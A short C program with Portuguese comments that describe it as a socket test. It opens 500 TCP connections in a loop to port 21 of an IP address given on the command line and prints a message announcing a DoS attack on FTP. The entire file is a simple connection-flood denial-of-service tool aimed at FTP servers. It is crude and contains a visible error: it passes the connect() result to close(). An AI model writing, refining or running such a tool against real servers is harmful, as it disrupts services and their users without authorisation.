/*
 * =====================================================================================
 *
 *       Filename:  socket.c
 *
 *    Description:  socket em c teste
 *
 *        Version:  1.0
 *        Created:  29-06-2016 19:57:46
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  YOUR NAME (), 
 *   Organization:  
 *
 * =====================================================================================
 */
#include <stdlib.h>
#include <stdio.h>
#include <netdb.h>
#include <fcntl.h>
#include <unistd.h>
#include <arpa/inet.h>

int main(int argc, char *argv[])
{
	int meusocket;
	int conecta;

	int ataque;
	int inicio = 0;
	int final = 500;
	char * destino;
	destino = argv[1];

	struct sockaddr_in alvo;
	for(ataque=inicio;ataque<final;ataque++)
	{
		meusocket = socket(AF_INET, SOCK_STREAM, 0);
		alvo.sin_family = AF_INET;
		alvo.sin_port = htons(21);
		alvo.sin_addr.s_addr = inet_addr(destino);

		conecta = connect(meusocket, (struct sockaddr *)& alvo, sizeof alvo);

		if(conecta == 0)
		{
			printf("Realizando ataque DoS em FTP \n");
		}else{
			close(meusocket);
			close(conecta);
		}
	}
}

